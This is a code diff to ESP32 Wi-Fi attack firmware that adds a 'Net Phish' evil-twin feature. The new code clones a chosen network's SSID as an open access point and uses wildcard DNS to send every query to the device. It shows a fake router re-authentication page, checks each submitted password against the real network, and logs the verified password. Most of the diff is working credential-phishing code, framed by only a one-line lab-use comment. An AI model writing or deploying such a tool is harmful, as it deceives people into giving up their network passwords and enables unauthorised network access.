@@ -43,6 +43,7 @@
 #include <BLEScan.h>
 #include <BLEAdvertisedDevice.h>
 #include <BLEAdvertising.h>
+#include <DNSServer.h>     // wildcard DNS for Net Phish captive portal
 
 // ─────────────────────────────────────────────────────────────
 //  Config
@@ -93,6 +94,7 @@ void stopBruteForce();
 void stopPMKIDCapture();
 void stopCombo();
 void stopAirtagScan();
+void stopNetPhish();
 bool pcapBegin(const char* path);
 void pcapWriteFrame(const uint8_t* data, uint16_t len);
 void pcapEnd();
@@ -163,6 +165,7 @@ enum Screen : uint8_t {
     SCR_BRUTE,           // brute-force progress screen
     SCR_PMKID,           // PMKID capture progress screen
     SCR_COMBO,           // auto-combo deauth → EAPOL handshake capture
+    SCR_PHISH,           // captive-portal evil-twin password phishing
     SCR_BLE_SCAN,
     SCR_BLE_LIST,        // scrollable device list shown after BLE scan
     SCR_BLE_SPAM,
@@ -186,12 +189,13 @@ static const char* WIFI_MENU_ITEMS[] = {
     "WiFi Brute",   // 2 — brute-force PSK against selected AP
     "Capture HS",   // 3 — auto: deauth burst → EAPOL listen
     "PMKID Grab",   // 4 — request EAPOL M1, extract PMKID
-    "Beacon Flood", // 5
-    "Beacon Count", // 6
-    "Probe Sniffer",// 7
-    "<< Back"       // 8
+    "Net Phish",    // 5 — clone SSID + captive portal → harvest PSK
+    "Beacon Flood", // 6
+    "Beacon Count", // 7
+    "Probe Sniffer",// 8
+    "<< Back"       // 9
 };
-static const int WIFI_MENU_N = 9;
+static const int WIFI_MENU_N = 10;
 
 // ── BLE sub-menu ──────────────────────────────────────────────
 static const char* BLE_MENU_ITEMS[] = {
@@ -382,6 +386,30 @@ struct AirtagEntry {
 AirtagEntry  g_airtags[MAX_AIRTAGS];
 volatile int g_airtagCount  = 0;
 volatile bool g_airtagActive = false;
+
+// ── Net Phish (Captive Portal Evil Twin) ───────────────────
+// Phases:
+//   0 = idle / off
+//   1 = AP cloned, waiting for victim to submit form
+//   2 = password received, verifying against real network
+//   3 = SUCCESS — password verified
+//   4 = FAILED — password wrong, awaiting next attempt
+struct {
+    bool     active     = false;
+    uint8_t  phase      = 0;
+    char     ssid[33]   = {};        // cloned SSID = target's SSID
+    uint8_t  bssid[6]   = {};        // real BSSID (informational only)
+    uint8_t  channel    = 6;
+    char     submittedPwd[64] = {};  // last password tried by victim
+    char     verifiedPwd[64]  = {};  // successful password
+    int      attempts   = 0;
+    int      clients    = 0;         // currently connected to clone
+    uint32_t startMs    = 0;
+    uint32_t verifyStartMs = 0;
+} g_phish;
+DNSServer    g_phishDns;
+TaskHandle_t g_phishDnsTask  = nullptr;
+TaskHandle_t g_phishVerifyTask = nullptr;
 
 // ── WiFi Brute-Force ─────────────────────────────────────
 struct {
@@ -1766,6 +1794,230 @@ void stopAirtagScan() {
 }
 
 // ─────────────────────────────────────────────────────────────
+//  ████  NET PHISH (Captive Portal Evil Twin)  ████
+// ─────────────────────────────────────────────────────────────
+// Authorized-research / lab-only network-impersonation tool.
+//
+// Flow:
+//   START: tear down ESP32-SecurityLab AP, bring up a NEW open AP
+//          using the target's SSID verbatim. Wildcard DNS sends every
+//          query → 192.168.4.1. HTTP routes that are normally landing
+//          page now serve a router-style password form.
+//   FORM:  victim's submitted password lands in g_phish.submittedPwd.
+//   VERIFY: ESP tears down clone AP, switches to STA, tries to
+//          associate with the real BSSID on its real channel using
+//          the submitted password. WL_CONNECTED within ~10 s = success.
+//   RESULT: on success, ssid + password shown on OLED and recorded.
+//          on failure, clone AP comes back up and the form is re-shown.
+
+// Captive-portal landing page — looks like a generic router auth screen.
+// Inline so it works even before LittleFS contents are uploaded.
+static const char PHISH_HTML[] PROGMEM = R"HTML(<!doctype html><html><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Wi-Fi Authentication</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,sans-serif;
+background:#f4f5f7;color:#222;min-height:100vh;display:flex;align-items:center;
+justify-content:center;padding:20px}
+.card{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.08);
+max-width:420px;width:100%;padding:32px 28px}
+.logo{width:48px;height:48px;background:#0066cc;border-radius:10px;
+display:flex;align-items:center;justify-content:center;color:#fff;
+font-size:22px;margin-bottom:16px}
+h1{font-size:22px;margin-bottom:6px;color:#111}
+.sub{color:#666;font-size:14px;margin-bottom:24px}
+.ssid{display:inline-block;background:#eef3ff;border:1px solid #cfdbf7;
+border-radius:6px;padding:3px 10px;font-weight:600;color:#0066cc;margin-bottom:18px}
+label{display:block;font-size:13px;color:#444;margin-bottom:6px;font-weight:500}
+input[type=password],input[type=text]{width:100%;padding:12px 14px;
+border:1px solid #d4d7dc;border-radius:8px;font-size:15px;outline:none;
+transition:border .15s}
+input:focus{border-color:#0066cc}
+button{width:100%;margin-top:18px;background:#0066cc;color:#fff;border:none;
+padding:13px;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;
+transition:background .15s}
+button:hover{background:#0052a3}
+.err{background:#fff3f3;border:1px solid #ffd6d6;color:#a51919;
+border-radius:6px;padding:10px 12px;margin-bottom:14px;font-size:13px}
+.foot{margin-top:18px;text-align:center;color:#888;font-size:12px}
+</style></head><body>
+<div class="card">
+<div class="logo">&#x2261;</div>
+<h1>Wi-Fi Re-authentication</h1>
+<p class="sub">Your connection to this network has expired. Please re-enter the Wi-Fi password to continue.</p>
+<span class="ssid">__SSID__</span>
+__ERR__
+<form method="POST" action="/auth" autocomplete="off">
+<label for="p">Wi-Fi password</label>
+<input id="p" name="p" type="password" placeholder="Network password" required minlength="8" maxlength="63" autofocus>
+<button type="submit">Connect</button>
+</form>
+<div class="foot">Secure connection required &middot; Router admin</div>
+</div></body></html>)HTML";
+
+static String phishRenderPage(bool showError) {
+    String out = FPSTR(PHISH_HTML);
+    // Sanitize SSID — replace < > & " ' with HTML entities to prevent
+    // XSS if a target SSID contains markup (some routers allow that)
+    String s = g_phish.ssid;
+    s.replace("&", "&amp;"); s.replace("<", "&lt;");  s.replace(">", "&gt;");
+    s.replace("\"","&quot;"); s.replace("'", "&#39;");
+    out.replace("__SSID__", s);
+    out.replace("__ERR__",
+        showError ? "<div class=\"err\">Incorrect password. Please try again.</div>"
+                  : "");
+    return out;
+}
+
+// DNS catch-all task — every query returns AP_IP, so any URL the
+// victim's browser tries (e.g. captive.apple.com, connectivitycheck.android.com)
+// resolves to the phish page.
+void phishDnsTaskFn(void*) {
+    while (g_phish.active) {
+        g_phishDns.processNextRequest();
+        vTaskDelay(pdMS_TO_TICKS(5));
+    }
+    g_phishDns.stop();
+    g_phishDnsTask = nullptr;
+    vTaskDelete(nullptr);
+}
+
+// Verification task — runs in phase 2. Swap to STA-only, try the
+// submitted password against the real network, report result, then
+// (on failure) bring the clone AP back up for another attempt.
+void phishVerifyTaskFn(void*) {
+    logAdd(String("Phish: verifying '") + g_phish.submittedPwd + "' on " + g_phish.ssid, "WARN");
+    g_phish.verifyStartMs = millis();
+
+    // Bring AP down so STA can fully own the radio (avoids the
+    // 'invalid interface' issue we hit before). Save current config
+    // so we can rebuild it after.
+    String savedAp = g_apSSID;
+    String savedPw = g_apPass;
+    uint8_t savedCh = AP_CHANNEL;
+
+    // Tear down phishing AP for the verification window
+    esp_wifi_set_mode(WIFI_MODE_STA);
+    vTaskDelay(pdMS_TO_TICKS(150));
+
+    WiFi.disconnect(false, false);
+    vTaskDelay(pdMS_TO_TICKS(120));
+    WiFi.begin((const char*)g_phish.ssid, (const char*)g_phish.submittedPwd);
+
+    bool connected = false;
+    unsigned long start = millis();
+    while (millis() - start < 10000) {  // 10 s window
+        wl_status_t st = WiFi.status();
+        if (st == WL_CONNECTED) { connected = true; break; }
+        if (st == WL_CONNECT_FAILED || st == WL_NO_SSID_AVAIL) break;
+        vTaskDelay(pdMS_TO_TICKS(150));
+    }
+
+    WiFi.disconnect(false, false);
+    vTaskDelay(pdMS_TO_TICKS(150));
+
+    if (connected) {
+        strncpy(g_phish.verifiedPwd, g_phish.submittedPwd, 63);
+        g_phish.verifiedPwd[63] = '\0';
+        g_phish.phase = 3;  // SUCCESS
+        logAdd(String("Phish SUCCESS: ") + g_phish.ssid + " = " + g_phish.verifiedPwd, "WARN");
+
+        // Persist
+        if (!LittleFS.exists("/captures")) LittleFS.mkdir("/captures");
+        File f = LittleFS.open("/captures/phish.log", "a");
+        if (f) {
+            f.printf("[%lu] SSID=%s PASS=%s ATTEMPTS=%d\n",
+                     (unsigned long)(millis()/1000),
+                     g_phish.ssid, g_phish.verifiedPwd, g_phish.attempts);
+            f.close();
+        }
+
+        // Keep AP off — we're done. User long-presses to stop.
+    } else {
+        g_phish.phase = 4;  // FAILED
+        logAdd(String("Phish: password '") + g_phish.submittedPwd + "' failed", "WARN");
+
+        // Re-arm the clone AP for another attempt
+        esp_wifi_set_mode(WIFI_MODE_APSTA);
+        vTaskDelay(pdMS_TO_TICKS(150));
+        WiFi.softAPConfig(AP_IP, AP_GW, AP_SN);
+        WiFi.softAP(g_phish.ssid, nullptr, g_phish.channel, 0, 8);
+        vTaskDelay(pdMS_TO_TICKS(200));
+        g_phish.phase = 1;  // back to waiting for input
+    }
+
+    g_phishVerifyTask = nullptr;
+    vTaskDelete(nullptr);
+}
+
+bool startNetPhish(const char* ssid, const uint8_t bssid[6], uint8_t channel) {
+    stopNetPhish();
+    // Stop conflicting modules — phish needs the radio + the web server
+    if (g_deauth.active)   stopDeauth();
+    if (g_beacon.active)   stopBeaconFlood();
+    if (g_brute.active)    stopBruteForce();
+    if (g_evilTwin.active) stopEvilTwin();
+    if (g_probeActive)     stopProbeSniffer();
+    if (g_eapolActive)     stopEapolSniffer();
+    if (g_pmkid.active)    stopPMKIDCapture();
+    if (g_combo.active)    stopCombo();
+
+    strncpy(g_phish.ssid, ssid, 32); g_phish.ssid[32] = '\0';
+    memcpy(g_phish.bssid, bssid, 6);
+    g_phish.channel        = channel;
+    g_phish.submittedPwd[0]= '\0';
+    g_phish.verifiedPwd[0] = '\0';
+    g_phish.attempts       = 0;
+    g_phish.clients        = 0;
+    g_phish.phase          = 1;
+    g_phish.startMs        = millis();
+    g_phish.active         = true;
+
+    // Bring up the clone AP — open (no password), target SSID, target channel
+    WiFi.disconnect(false, false);
+    esp_wifi_set_mode(WIFI_MODE_APSTA);
+    vTaskDelay(pdMS_TO_TICKS(150));
+    WiFi.softAPConfig(AP_IP, AP_GW, AP_SN);
+    WiFi.softAP(g_phish.ssid, nullptr, g_phish.channel, 0, 8);
+    vTaskDelay(pdMS_TO_TICKS(200));
+
+    // Wildcard DNS — every domain resolves to AP_IP
+    g_phishDns.setErrorReplyCode(DNSReplyCode::NoError);
+    g_phishDns.start(53, "*", AP_IP);
+    xTaskCreatePinnedToCore(phishDnsTaskFn, "phish_dns", 4096,
+                            nullptr, 3, &g_phishDnsTask, 1);
+
+    logAdd(String("Phish started: clone='") + g_phish.ssid +
+           "' ch=" + String(g_phish.channel), "WARN");
+    return true;
+}
+
+void stopNetPhish() {
+    if (!g_phish.active) return;
+    g_phish.active = false;
+
+    // DNS task observes the flag and exits
+    for (int i = 0; i < 10 && g_phishDnsTask; i++) vTaskDelay(pdMS_TO_TICKS(50));
+    if (g_phishDnsTask) { vTaskDelete(g_phishDnsTask); g_phishDnsTask = nullptr; }
+    g_phishDns.stop();
+
+    // Verify task — let it finish (max ~12 s)
+    for (int i = 0; i < 130 && g_phishVerifyTask; i++) vTaskDelay(pdMS_TO_TICKS(100));
+    if (g_phishVerifyTask) { vTaskDelete(g_phishVerifyTask); g_phishVerifyTask = nullptr; }
+
+    // Restore the original REAPER AP
+    esp_wifi_set_mode(WIFI_MODE_APSTA);
+    vTaskDelay(pdMS_TO_TICKS(150));
+    WiFi.softAPConfig(AP_IP, AP_GW, AP_SN);
+    WiFi.softAP(g_apSSID.c_str(), g_apPass.c_str(), AP_CHANNEL, 0, 8);
+    vTaskDelay(pdMS_TO_TICKS(200));
+
+    g_phish.phase = 0;
+    logAdd("Phish stopped");
+}
+
+// ─────────────────────────────────────────────────────────────
 //  ████  OLED DRAWING  ████
 // ─────────────────────────────────────────────────────────────
 
@@ -2144,6 +2396,58 @@ static void drawCombo() {
     oled.display();
 }
 
+// ── Net Phish (captive-portal evil-twin) ─────────────────────
+static void drawPhish() {
+    oled.clearDisplay();
+    const char* status =
+        g_phish.phase == 3 ? "PWNED" :
+        g_phish.phase == 2 ? "CHECK" :
+        g_phish.phase == 4 ? "WRONG" :
+        g_phish.phase == 1 ? "BAIT"  : "STOP";
+    oledHeader("Net Phish", status);
+    oled.setTextColor(WHITE); oled.setTextSize(1);
+
+    char buf[24];
+    snprintf(buf, sizeof(buf), "AP: %.16s", g_phish.ssid[0] ? g_phish.ssid : "(none)");
+    oled.setCursor(0, 14); oled.print(buf);
+
+    if (g_phish.phase == 3) {
+        // SUCCESS — show captured password (truncated to 18 chars)
+        oled.setCursor(0, 26); oled.print("PASSWORD:");
+        char shown[19]; strncpy(shown, g_phish.verifiedPwd, 18); shown[18] = '\0';
+        oled.setCursor(0, 38); oled.print(shown);
+        snprintf(buf, sizeof(buf), "(attempts: %d)", g_phish.attempts);
+        oled.setCursor(0, 50); oled.print(buf);
+        oledHint(">back   hold=stop");
+    } else if (g_phish.phase == 2) {
+        uint32_t secs = (millis() - g_phish.verifyStartMs) / 1000;
+        snprintf(buf, sizeof(buf), "Verifying... %lus", (unsigned long)secs);
+        oled.setCursor(0, 26); oled.print(buf);
+        char shown[19]; strncpy(shown, g_phish.submittedPwd, 18); shown[18] = '\0';
+        oled.setCursor(0, 38); oled.print(shown);
+        oledHint(">back   hold=stop");
+    } else if (g_phish.phase == 4 || g_phish.phase == 1) {
+        // BAIT or after a WRONG attempt
+        snprintf(buf, sizeof(buf), "Clients: %d", (int)WiFi.softAPgetStationNum());
+        oled.setCursor(0, 26); oled.print(buf);
+        if (g_phish.attempts > 0) {
+            snprintf(buf, sizeof(buf), "Wrong: %d", g_phish.attempts);
+            oled.setCursor(0, 38); oled.print(buf);
+            char shown[19]; strncpy(shown, g_phish.submittedPwd, 18); shown[18] = '\0';
+            oled.setCursor(0, 50); oled.print(shown);
+        } else {
+            oled.setCursor(0, 38); oled.print("Open AP cloned");
+            oled.setCursor(0, 50); oled.print("Waiting for input");
+        }
+        oledHint(">back   hold=stop");
+    } else {
+        oled.setCursor(0, 26); oled.print("Pick target with *");
+        oled.setCursor(0, 38); oled.print("then long-press here");
+        oledHint(">back   hold=start");
+    }
+    oled.display();
+}
+
 // ── AirTag / Find My scanner ─────────────────────────────────
 static void drawAirtag() {
     oled.clearDisplay();
@@ -2333,6 +2637,7 @@ void refreshOLED() {
         case SCR_BRUTE:        drawBrute();       break;
         case SCR_PMKID:        drawPMKID();       break;
         case SCR_COMBO:        drawCombo();       break;
+        case SCR_PHISH:        drawPhish();       break;
         case SCR_AIRTAG:       drawAirtag();      break;
         case SCR_BLE_SCAN:     drawBLEScan();     break;
         case SCR_BLE_LIST:     drawBLEList();     break;
@@ -2415,6 +2720,7 @@ static void handleShortPress() {
     case SCR_BRUTE:
     case SCR_PMKID:
     case SCR_COMBO:
+    case SCR_PHISH:
         g_screen = SCR_WIFI_MENU;
         break;
 
@@ -2521,10 +2827,25 @@ static void handleLongPress() {
                 }
                 break;
             }
-            case 5: g_screen = SCR_BEACON;       break;
-            case 6: g_screen = SCR_BEACON_COUNT; break;
-            case 7: g_screen = SCR_PROBE;        break;
-            case 8: g_screen = SCR_MAIN;         break;  // Back
+            case 5: {  // Net Phish — clone target + captive portal
+                g_screen = SCR_PHISH;
+                if (!g_phish.active) {
+                    int picked = -1;
+                    for (int i = 0; i < g_apCount; i++)
+                        if (g_aps[i].selected) { picked = i; break; }
+                    if (picked < 0)
+                        logAdd("Phish: no target selected (Scan → *)", "WARN");
+                    else
+                        startNetPhish(g_aps[picked].ssid,
+                                      g_aps[picked].bssid,
+                                      g_aps[picked].channel);
+                }
+                break;
+            }
+            case 6: g_screen = SCR_BEACON;       break;
+            case 7: g_screen = SCR_BEACON_COUNT; break;
+            case 8: g_screen = SCR_PROBE;        break;
+            case 9: g_screen = SCR_MAIN;         break;  // Back
         }
         break;
 
@@ -2624,6 +2945,23 @@ static void handleLongPress() {
                 startPMKIDCapture(g_aps[picked].ssid,
                                   g_aps[picked].bssid,
                                   g_aps[picked].channel);
+        }
+        break;
+
+    // ── Net Phish: long-press toggles ────────────────────────
+    case SCR_PHISH:
+        if (g_phish.active) {
+            stopNetPhish();
+        } else {
+            int picked = -1;
+            for (int i = 0; i < g_apCount; i++)
+                if (g_aps[i].selected) { picked = i; break; }
+            if (picked < 0)
+                logAdd("Phish: no target selected (Scan → *)", "WARN");
+            else
+                startNetPhish(g_aps[picked].ssid,
+                              g_aps[picked].bssid,
+                              g_aps[picked].channel);
         }
         break;
 
@@ -2727,14 +3065,58 @@ static void serveHtml(AsyncWebServerRequest* req, const char* fsPath) {
 }
 
 void setupRoutes() {
-    // REAPER web surface = landing page only.
-    // All operational control is on the OLED + BOOT button.
-    // No attack endpoints exposed over HTTP.
-    server.serveStatic("/style.css",LittleFS,"/style.css").setCacheControl("max-age=604800, public");
-    server.serveStatic("/",         LittleFS,"/"        ).setDefaultFile("index.html");
+    // ── Net Phish: POST /auth receives the form submission ────────
+    // Registered first so it always wins over static handlers.
+    server.on("/auth", HTTP_POST, [](AsyncWebServerRequest* req){
+        if (!g_phish.active) { req->send(404, "text/plain", "Not Found"); return; }
+        if (g_phish.phase == 2) {
+            // Already verifying — re-show form so victim doesn't see a 404
+            req->send(200, "text/html", phishRenderPage(false));
+            return;
+        }
+        if (!req->hasParam("p", true)) {
+            req->send(200, "text/html", phishRenderPage(true));
+            return;
+        }
+        const AsyncWebParameter* pp = req->getParam("p", true);
+        const String& pwd = pp->value();
+        if (pwd.length() < 8 || pwd.length() > 63) {
+            req->send(200, "text/html", phishRenderPage(true));
+            return;
+        }
+        strncpy(g_phish.submittedPwd, pwd.c_str(), 63);
+        g_phish.submittedPwd[63] = '\0';
+        g_phish.attempts++;
+        g_phish.phase = 2;  // VERIFYING
+
+        // Spawn the verify task — runs ~10 s
+        if (!g_phishVerifyTask) {
+            xTaskCreatePinnedToCore(phishVerifyTaskFn, "phish_vfy", 8192,
+                                    nullptr, 4, &g_phishVerifyTask, 1);
+        }
+        // Show a brief "Connecting…" page so the victim waits.
+        req->send(200, "text/html",
+            "<!doctype html><html><head><meta charset=utf-8>"
+            "<meta http-equiv=refresh content=\"12;url=/\">"
+            "<title>Connecting...</title></head>"
+            "<body style=\"font-family:sans-serif;text-align:center;padding-top:80px;color:#444\">"
+            "<h2>Connecting...</h2><p>Please wait while the network re-authenticates.</p>"
+            "</body></html>");
+    });
+
+    // ── Catch-all GET: phishing landing OR REAPER landing ─────────
+    server.serveStatic("/style.css", LittleFS, "/style.css")
+          .setCacheControl("max-age=604800, public");
+    server.serveStatic("/", LittleFS, "/").setDefaultFile("index.html");
 
     server.onNotFound([](AsyncWebServerRequest* req){
-        req->send(404,"application/json","{\"error\":\"Not Found\"}");
+        // While phishing is active, any unmatched URL returns the
+        // captive-portal page (so apple/android probes all see it).
+        if (g_phish.active) {
+            req->send(200, "text/html", phishRenderPage(g_phish.phase == 4));
+            return;
+        }
+        req->send(404, "application/json", "{\"error\":\"Not Found\"}");
     });
 }
 
